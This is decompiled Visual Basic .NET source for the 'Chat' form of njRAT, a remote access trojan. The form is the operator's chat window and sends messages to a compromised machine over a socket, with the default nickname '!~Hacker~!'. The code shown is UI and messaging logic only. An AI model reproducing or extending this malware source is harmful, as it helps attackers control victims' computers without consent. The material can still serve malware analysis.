Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices

Namespace NJRAT
	' Token: 0x0200000E RID: 14
	<DesignerGenerated()>
	Public Partial Class Chat
		Inherits Form

		' Token: 0x06000114 RID: 276 RVA: 0x0014FE54 File Offset: 0x0014E254
		<DebuggerNonUserCode()>
		Private Shared Sub __ENCAddToList(value As Object)
			Dim _ENCList As List(Of WeakReference) = Chat.__ENCList
			SyncLock _ENCList
				Dim flag As Boolean = Chat.__ENCList.Count = Chat.__ENCList.Capacity
				If flag Then
					Dim num As Integer = 0
					Dim num2 As Integer = 0
					Dim num3 As Integer = Chat.__ENCList.Count - 1
					Dim num4 As Integer = num2
					While True
						Dim num5 As Integer = num4
						Dim num6 As Integer = num3
						If num5 > num6 Then
							Exit For
						End If
						Dim weakReference As WeakReference = Chat.__ENCList(num4)
						flag = weakReference.IsAlive
						If flag Then
							Dim flag2 As Boolean = num4 <> num
							If flag2 Then
								Chat.__ENCList(num) = Chat.__ENCList(num4)
							End If
							num += 1
						End If
						num4 += 1
					End While
					Chat.__ENCList.RemoveRange(num, Chat.__ENCList.Count - num)
					Chat.__ENCList.Capacity = Chat.__ENCList.Count
				End If
				Chat.__ENCList.Add(New WeakReference(RuntimeHelpers.GetObjectValue(value)))
			End SyncLock
		End Sub

		' Token: 0x17000068 RID: 104
		' (get) Token: 0x06000117 RID: 279 RVA: 0x001502B8 File Offset: 0x0014E6B8
		' (set) Token: 0x06000118 RID: 280 RVA: 0x001502D0 File Offset: 0x0014E6D0
		Friend Overridable Property T2 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._T2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim value2 As KeyEventHandler = AddressOf Me.T2_KeyDown
				Dim flag As Boolean = Me._T2 IsNot Nothing
				If flag Then
					RemoveHandler Me._T2.KeyDown, value2
				End If
				Me._T2 = value
				flag = (Me._T2 IsNot Nothing)
				If flag Then
					AddHandler Me._T2.KeyDown, value2
				End If
			End Set
		End Property

		' Token: 0x17000069 RID: 105
		' (get) Token: 0x06000119 RID: 281 RVA: 0x00150330 File Offset: 0x0014E730
		' (set) Token: 0x0600011A RID: 282 RVA: 0x00150348 File Offset: 0x0014E748
		Friend Overridable Property Button1 As Button
			<DebuggerNonUserCode()>
			Get
				Return Me._Button1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim flag As Boolean = Me._Button1 IsNot Nothing
				If flag Then
					RemoveHandler Me._Button1.Click, value2
				End If
				Me._Button1 = value
				flag = (Me._Button1 IsNot Nothing)
				If flag Then
					AddHandler Me._Button1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700006A RID: 106
		' (get) Token: 0x0600011B RID: 283 RVA: 0x001503A8 File Offset: 0x0014E7A8
		' (set) Token: 0x0600011C RID: 284 RVA: 0x001503C0 File Offset: 0x0014E7C0
		Friend Overridable Property vmethod_8 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_8
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim flag As Boolean = Me._vmethod_8 IsNot Nothing
				If flag Then
					RemoveHandler Me._vmethod_8.Tick, value2
				End If
				Me._vmethod_8 = value
				flag = (Me._vmethod_8 IsNot Nothing)
				If flag Then
					AddHandler Me._vmethod_8.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x1700006B RID: 107
		' (get) Token: 0x0600011D RID: 285 RVA: 0x00150420 File Offset: 0x0014E820
		' (set) Token: 0x0600011E RID: 286 RVA: 0x00150438 File Offset: 0x0014E838
		Friend Overridable Property T1 As RichTextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._T1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RichTextBox)
				Me._T1 = value
			End Set
		End Property

		' Token: 0x0600011F RID: 287 RVA: 0x00150444 File Offset: 0x0014E844
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.Chat_FormClosing
			AddHandler MyBase.Load, AddressOf Me.Chat_Load
			Chat.__ENCAddToList(Me)
			Me.hk = "!~Hacker~!"
			Me.InitializeComponent()
		End Sub

		' Token: 0x06000120 RID: 288 RVA: 0x0015049C File Offset: 0x0014E89C
		Private Sub Chat_FormClosing(sender As Object, e As FormClosingEventArgs)
			Dim cn As Boolean = Me.sk.CN
			If cn Then
				Me.sk.Send("@")
			End If
			Me.sk.CN = False
		End Sub

		' Token: 0x06000121 RID: 289 RVA: 0x001504D8 File Offset: 0x0014E8D8
		Private Sub Chat_Load(sender As Object, e As EventArgs)
			Me.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.osk.L)))
			Me.Show()
			Dim left As String = Interaction.InputBox("Enter Your NickName", "Chat", Me.hk, -1, -1)
			Dim flag As Boolean = Operators.CompareString(left, String.Empty, False) = 0
			If flag Then
				Me.sk.CN = False
			Else
				Me.hk = left
				Me.sk.Send("~" + Class7.string_1 + Class6.smethod_14(Me.hk))
			End If
			Me.vmethod_8.Enabled = True
			Me.T2.[Select]()
			Me.T2.Focus()
		End Sub

		' Token: 0x06000122 RID: 290 RVA: 0x0015059C File Offset: 0x0014E99C
		Private Sub T2_KeyDown(sender As Object, e As KeyEventArgs)
			Dim flag As Boolean = e.KeyCode = Keys.[Return]
			If flag Then
				e.SuppressKeyPress = True
				flag = (Operators.CompareString(Me.T2.Text, String.Empty, False) <> 0)
				If flag Then
					SyncLock Me
						Me.T1.SelectionStart = Me.T1.TextLength
						Me.T1.SelectionFont = New Font(Me.T1.Font, FontStyle.Bold)
						Me.T1.AppendText(Me.hk + " : ")
						Me.T1.SelectionFont = Me.T1.Font
						Me.T1.AppendText(Me.T2.Text + vbCrLf)
						Me.T1.SelectionStart = Me.T1.TextLength
						Me.T1.ScrollToCaret()
						Dim t As TextBox = Me.T2
						Dim text As String = t.Text
						t.Text = text
						Me.sk.Send("!" + Class7.string_1 + Class6.smethod_14(text))
						Me.T2.Text = String.Empty
					End SyncLock
				End If
			Else
				Me.T2.[Select]()
			End If
		End Sub

		' Token: 0x06000123 RID: 291 RVA: 0x00150718 File Offset: 0x0014EB18
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Operators.CompareString(Me.T2.Text, String.Empty, False) <> 0
			If flag Then
				SyncLock Me
					Me.T1.SelectionStart = Me.T1.TextLength
					Me.T1.SelectionFont = New Font(Me.T1.Font, FontStyle.Bold)
					Me.T1.AppendText(Me.hk + " : ")
					Me.T1.SelectionFont = Me.T1.Font
					Me.T1.AppendText(Me.T2.Text + vbCrLf)
					Me.T1.SelectionStart = Me.T1.TextLength
					Me.T1.ScrollToCaret()
					Dim t As TextBox = Me.T2
					Dim text As String = t.Text
					t.Text = text
					Me.sk.Send("!" + Class7.string_1 + Class6.smethod_14(text))
					Me.T2.Text = String.Empty
				End SyncLock
			End If
		End Sub

		' Token: 0x06000124 RID: 292 RVA: 0x0015086C File Offset: 0x0014EC6C
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.sk Is Nothing Or Me.osk Is Nothing
			If flag Then
				Dim flag2 As Boolean = Me.T2.Enabled Or Operators.CompareString(Me.T1.Text, String.Empty, False) = 0
				If flag2 Then
					Me.T1.AppendText("Disconnected ...")
				End If
				Me.T2.Enabled = False
				Me.Button1.Enabled = False
				Me.sk.Send("@")
				Me.sk.CN = False
				Me.Close()
			Else
				Dim flag2 As Boolean = Not Me.sk.CN Or Not Me.osk.CN
				If flag2 Then
					flag = (Me.T2.Enabled Or Operators.CompareString(Me.T1.Text, String.Empty, False) = 0)
					If flag Then
						Me.T1.AppendText("Disconnected ...")
					End If
					Me.T2.Enabled = False
					Me.Button1.Enabled = False
					Me.sk.Send("@")
					Me.sk.CN = False
					Me.Close()
				End If
			End If
		End Sub

		' Token: 0x06000125 RID: 293 RVA: 0x001509AC File Offset: 0x0014EDAC
		Private Sub T1_LinkClicked(sender As Object, e As LinkClickedEventArgs)
			Try
				Process.Start(e.LinkText)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x04000082 RID: 130
		Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)()

		' Token: 0x04000084 RID: 132
		<AccessedThroughProperty("T2")>
		Private _T2 As TextBox

		' Token: 0x04000085 RID: 133
		<AccessedThroughProperty("Button1")>
		Private _Button1 As Button

		' Token: 0x04000086 RID: 134
		<AccessedThroughProperty("vmethod_8")>
		Private _vmethod_8 As Timer

		' Token: 0x04000087 RID: 135
		<AccessedThroughProperty("T1")>
		Private _T1 As RichTextBox

		' Token: 0x04000088 RID: 136
		Public hk As String

		' Token: 0x04000089 RID: 137
		Public osk As Client

		' Token: 0x0400008A RID: 138
		Public sk As Client
	End Class
End Namespace
